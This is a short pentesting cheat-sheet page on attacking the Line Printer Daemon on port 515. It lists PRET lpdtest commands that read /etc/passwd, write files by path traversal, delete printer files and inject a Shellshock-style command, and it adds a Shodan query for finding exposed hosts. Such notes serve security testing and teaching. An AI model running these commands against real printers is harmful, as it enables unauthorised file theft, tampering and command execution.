515 - Pentesting Line Printer Daemon (LPD)

The Line Printer Daemon (LPD) protocol had originally been introduced in Berkeley Unix in the 80s (later specified by RFC1179).
The daemon runs on port 515/tcp and can be accessed using the lprcommand. To print, the client sends a control file defining job/username and a data file containing the actual data to be printed. The input type of the data file can be set in the control file by choosing among various file formats. However it is up to the LPD implementation how to actually handle the print data. A popular LPD implementation for Unix-like operating system is LPRng. LPD can be used as a carrier to deploy malicious PostScript or PJL print jobs. 

The lpdprint and lpdtest tools are included in PRET. They are a minimalist way to print data directly to an LPD capable printer or download/upload/delete files and more:

lpdprint.py hostname filename
lpdtest.py hostname get /etc/passwd
lpdtest.py hostname put ../../etc/passwd
lpdtest.py hostname rm /some/file/on/printer
lpdtest.py hostname in '() {:;}; ping -c1 1.2.3.4'
lpdtest.py hostname mail lpdtest@mailhost.local

If you want to learn more about hacking printers read this page.
Shodan

    port 515
